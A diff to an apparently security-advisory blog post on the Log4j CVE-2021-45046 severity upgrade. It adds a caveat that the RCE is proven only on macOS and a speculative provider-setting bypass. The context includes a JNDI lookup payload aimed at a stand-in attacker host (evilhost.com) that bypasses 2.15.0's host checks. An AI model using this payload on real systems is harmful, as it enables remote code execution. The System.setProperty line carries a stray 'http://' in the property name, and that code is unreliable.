@@ -40,7 +40,9 @@ authors:
 _The logo gets worse as the situation gets worse..._
 
 Earlier today, the second Log4j vulnerability (CVE-2021-45046) was upgraded from a [CVSS score of 3.7](https://web.archive.org/web/20211215180723/https://logging.apache.org/log4j/2.x/security.html)
-(limited DOS) to a [CVSS score of 9.0](https://logging.apache.org/log4j/2.x/security.html) (limited RCE).
+(limited DOS) to a [CVSS score of 9.0](https://logging.apache.org/log4j/2.x/security.html) (limited RCE). Note: the reported
+limited RCE has only been proven to be exploitable on macOS at the moment. We expect, in time, that other operating systems
+will also be shown to be exploitable.
 
 See the bottom of this post for an example exploit payload that bypasses the checks in log4j 2.15.0.
 
@@ -137,6 +139,20 @@ This payload will bypass the network host restrictions in log4j 2.15.0 and allow
 ${jndi:ldap://127.0.0.1#evilhost.com:1389/a}
 ```
 
+As noted in the security report, a proof of concept exploit has only been successfully executed on macOS. Considering
+how many Java developers may use macOS, this is still a significant finding.
+
+We are still investigating how to have this exploit work properly on other operating systems. It has been proposed that
+[changing the default provider](https://docs.oracle.com/javase/7/docs/technotes/guides/net/properties.html#:~:text=sun.net.spi.nameservice.provider.%3Cn%3E%3D%3Cdefault%7Cdns%2Csun%7C...%3E)
+to `dns,sun`:
+
+```
+System.setProperty("http://sun.net.spi.nameservice.provider.1", "dns,sun")
+```
+
+will cause the exploit to bypass the allowed hosts check in `2.15.0` properly. However, we have not been able to replicate
+this yet.
+
 ## Stay Updated
 
 Please follow us on [Twitter](https://twitter.com/LunaSecIO) or add yourself to our mailing list below, and we'll
@@ -170,3 +186,7 @@ confused about our advice, please [file an Issue](https://github.com/lunasec-io/
 If you would like to contribute, or notice any errors, this post is an Open Source Markdown file on
 [GitHub](https://github.com/lunasec-io/lunasec/blob/master/docs/blog/2021-12-17-log4j-update-increased-cvss.mdx).
 :::
+
+### Edits
+
+1. Added a note that the RCE has only been provably exploitable on macOS
